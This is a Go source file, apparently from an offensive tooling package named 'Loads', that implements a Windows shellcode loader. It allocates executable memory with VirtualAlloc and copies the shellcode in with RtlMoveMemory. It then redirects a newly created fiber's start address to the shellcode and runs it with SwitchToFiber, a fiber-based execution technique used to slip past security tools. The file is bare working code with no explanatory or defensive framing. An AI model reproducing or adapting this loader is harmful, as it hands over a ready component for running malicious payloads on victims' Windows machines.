package Loads

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	CreateFiber          = kernel32.MustFindProc("CreateFiber")
	SwitchToFiber        = kernel32.MustFindProc("SwitchToFiber")
	ConvertThreadToFiber = kernel32.MustFindProc("ConvertThreadToFiber")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

func dummy() {
	var age string
	fmt.Scanln(&age)
}

func Callback(shellcode []byte) {
	var d func()
	d = dummy
	ConvertThreadToFiber.Call(NULL)
	lpFiber, err1, _ := CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&d)), NULL)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if lpFiber == NULL {
		fmt.Printf("GLE : %d\n", err1)
		os.Exit(0)
	}

	tgtFuncAddr := (*uintptr)(unsafe.Pointer(lpFiber + uintptr(0xB0)))
	*tgtFuncAddr = addr
	fmt.Println(tgtFuncAddr)
	SwitchToFiber.Call(lpFiber)
}
